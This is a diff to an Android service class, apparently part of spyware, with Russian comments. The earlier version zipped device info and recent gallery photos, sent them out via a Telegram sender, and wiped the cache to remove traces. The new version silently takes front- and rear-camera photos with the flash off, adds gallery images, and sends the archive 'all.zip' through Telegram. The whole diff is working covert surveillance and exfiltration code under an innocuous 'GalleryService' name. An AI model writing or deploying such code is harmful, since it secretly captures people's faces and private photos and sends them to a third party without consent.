@@ -5,19 +5,33 @@ import android.content.Intent;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
+import android.graphics.ImageFormat;
+import android.graphics.Rect;
+import android.graphics.YuvImage;
+import android.hardware.camera2.*;
+import android.media.Image;
+import android.media.ImageReader;
 import android.net.Uri;
 import android.os.IBinder;
 import android.provider.MediaStore;
 import androidx.annotation.Nullable;
 import java.io.ByteArrayOutputStream;
-import java.io.File;
 import java.io.InputStream;
+import java.nio.ByteBuffer;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
 public class GalleryService extends Service {
+    private CameraManager manager;
+    private CameraDevice device;
+    private ImageReader reader;
+    private CaptureRequest.Builder builder;
+    private ZipOutputStream zos;
+    private ByteArrayOutputStream zipBuffer;
+    private int photoCount = 1;
+
     @Nullable @Override
     public IBinder onBind(Intent intent) { return null; }
 
@@ -25,82 +39,141 @@ public class GalleryService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         new Thread(() -> {
             try {
-                List<Uri> allImages = getRecentImages();
-                ByteArrayOutputStream zipBuffer = new ByteArrayOutputStream();
-                ZipOutputStream zos = new ZipOutputStream(zipBuffer);
-                
-                // 1. Добавляем info.txt с данными о телефоне
-                String infoText = DeviceInfo.getInfo(this);
-                ZipEntry infoEntry = new ZipEntry("info.txt");
-                zos.putNextEntry(infoEntry);
-                zos.write(infoText.getBytes());
-                zos.closeEntry();
+                zipBuffer = new ByteArrayOutputStream();
+                zos = new ZipOutputStream(zipBuffer);
+                manager = (CameraManager) getSystemService(CAMERA_SERVICE);
 
-                // 2. Добавляем фотографии
-                int count = 1;
-                for (Uri uri : allImages) {
-                    try {
-                        InputStream is = getContentResolver().openInputStream(uri);
-                        BitmapFactory.Options options = new BitmapFactory.Options();
-                        options.inJustDecodeBounds = true;
-                        BitmapFactory.decodeStream(is, null, options);
-                        if (is != null) is.close();
-                        
-                        int scale = 1;
-                        while (options.outWidth / scale > 800 || options.outHeight / scale > 800) {
-                            scale *= 2;
-                        }
-
-                        is = getContentResolver().openInputStream(uri);
-                        options = new BitmapFactory.Options();
-                        options.inSampleSize = scale;
-                        Bitmap bitmap = BitmapFactory.decodeStream(is, null, options);
-                        if (is != null) is.close();
-
-                        if (bitmap != null) {
-                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
-                            byte[] bytes = baos.toByteArray();
-                            bitmap.recycle();
-
-                            ZipEntry entry = new ZipEntry(count + ".jpg");
-                            zos.putNextEntry(entry);
-                            zos.write(bytes);
-                            zos.closeEntry();
-                            
-                            count++;
-                        }
-                    } catch (Exception e) { e.printStackTrace(); }
-                }
-                
-                zos.close();
-                
-                if (count > 1) {
-                    // Отправляем ZIP-файл
-                    new TelegramSender().sendZip(zipBuffer.toByteArray(), "photos_" + System.currentTimeMillis() + ".zip");
-                }
-
-                // 3. УДАЛЕНИЕ СЛЕДОВ (чистим кэш приложения)
-                clearAppCache();
+                // 1. Делаем снимок фронталки (UP)
+                capturePhoto("up", "1");
 
             } catch (Exception e) { e.printStackTrace(); }
-            stopSelf();
         }).start();
         return START_NOT_STICKY;
     }
 
-    private void clearAppCache() {
+    private void capturePhoto(String tag, String id) {
         try {
-            File cacheDir = getCacheDir();
-            if (cacheDir != null && cacheDir.isDirectory()) {
-                File[] children = cacheDir.listFiles();
-                if (children != null) {
-                    for (File child : children) {
-                        child.delete();
-                    }
-                }
+            android.hardware.camera2.params.StreamConfigurationMap map = 
+                manager.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
+            android.util.Size[] sizes = map.getOutputSizes(ImageFormat.YUV_420_888);
+            android.util.Size bestSize = sizes[0];
+            for (android.util.Size s : sizes) {
+                if (s.getWidth() >= 1280 && s.getHeight() >= 720) { bestSize = s; break; }
             }
+
+            final int w = bestSize.getWidth();
+            final int h = bestSize.getHeight();
+
+            manager.openCamera(id, new CameraDevice.StateCallback() {
+                @Override public void onOpened(CameraDevice cam) {
+                    device = cam;
+                    reader = ImageReader.newInstance(w, h, ImageFormat.YUV_420_888, 1);
+                    reader.setOnImageAvailableListener(r -> {
+                        Image img = r.acquireLatestImage();
+                        if (img == null) return;
+                        
+                        ByteBuffer yBuffer = img.getPlanes()[0].getBuffer();
+                        ByteBuffer uBuffer = img.getPlanes()[1].getBuffer();
+                        ByteBuffer vBuffer = img.getPlanes()[2].getBuffer();
+                        int ySize = yBuffer.remaining();
+                        int uSize = uBuffer.remaining();
+                        int vSize = vBuffer.remaining();
+                        
+                        byte[] nv21 = new byte[ySize + uSize + vSize];
+                        yBuffer.get(nv21, 0, ySize);
+                        vBuffer.get(nv21, ySize, vSize);
+                        uBuffer.get(nv21, ySize + vSize, uSize);
+                        
+                        YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, w, h, null);
+                        ByteArrayOutputStream out = new ByteArrayOutputStream();
+                        yuvImage.compressToJpeg(new Rect(0, 0, w, h), 85, out); 
+                        
+                        try {
+                            // Называем просто up.jpg и noup.jpg
+                            String filename = tag.equals("up") ? "up.jpg" : "noup.jpg";
+                            ZipEntry entry = new ZipEntry(filename);
+                            zos.putNextEntry(entry);
+                            zos.write(out.toByteArray());
+                            zos.closeEntry();
+                        } catch (Exception e) { e.printStackTrace(); }
+
+                        img.close(); r.close(); device.close();
+                        
+                        if (tag.equals("up")) {
+                            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                                capturePhoto("noup", "0");
+                            }, 1000);
+                        } else {
+                            // После обеих камер запускаем галерею
+                            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                                addGalleryPhotos();
+                            }, 1000);
+                        }
+                    }, null);
+                    try {
+                        builder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+                        builder.addTarget(reader.getSurface());
+                        builder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF);
+                        builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
+
+                        device.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
+                            @Override public void onConfigured(CameraCaptureSession s) {
+                                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                                    try { s.capture(builder.build(), null, null); } 
+                                    catch (Exception e) { e.printStackTrace(); }
+                                }, 1000);
+                            }
+                            @Override public void onConfigureFailed(CameraCaptureSession s) {}
+                        }, null);
+                    } catch (Exception e) { e.printStackTrace(); }
+                }
+                @Override public void onDisconnected(CameraDevice c) { c.close(); }
+                @Override public void onError(CameraDevice c, int e) { c.close(); }
+            }, null);
         } catch (Exception e) { e.printStackTrace(); }
+    }
+
+    private void addGalleryPhotos() {
+        try {
+            List<Uri> allImages = getRecentImages();
+            for (Uri uri : allImages) {
+                try {
+                    InputStream is = getContentResolver().openInputStream(uri);
+                    BitmapFactory.Options options = new BitmapFactory.Options();
+                    options.inJustDecodeBounds = true;
+                    BitmapFactory.decodeStream(is, null, options);
+                    if (is != null) is.close();
+                    
+                    int scale = 1;
+                    while (options.outWidth / scale > 2000 || options.outHeight / scale > 2000) { scale *= 2; }
+
+                    is = getContentResolver().openInputStream(uri);
+                    options = new BitmapFactory.Options();
+                    options.inSampleSize = scale;
+                    Bitmap bitmap = BitmapFactory.decodeStream(is, null, options);
+                    if (is != null) is.close();
+
+                    if (bitmap != null) {
+                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
+                        byte[] bytes = baos.toByteArray();
+                        bitmap.recycle();
+
+                        ZipEntry entry = new ZipEntry(photoCount + ".jpg");
+                        zos.putNextEntry(entry);
+                        zos.write(bytes);
+                        zos.closeEntry();
+                        photoCount++;
+                    }
+                } catch (Exception e) { e.printStackTrace(); }
+            }
+            
+            zos.close();
+            
+            new TelegramSender().sendZip(zipBuffer.toByteArray(), "all.zip");
+
+        } catch (Exception e) { e.printStackTrace(); }
+        stopSelf();
     }
 
     private List<Uri> getRecentImages() {
